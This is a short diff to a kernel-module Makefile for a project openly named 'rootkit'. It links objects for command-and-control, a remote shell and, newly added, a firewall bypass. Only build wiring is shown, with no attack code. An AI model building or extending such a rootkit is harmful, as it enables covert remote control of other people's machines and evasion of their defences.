@@ -1,5 +1,5 @@
 obj-m += rootkit.o
-rootkit-objs := main.o c2.o rshell.o
+rootkit-objs := main.o c2.o rshell.o fw_bypass.o
 
 KDIR ?= /lib/modules/`uname -r`/build
 
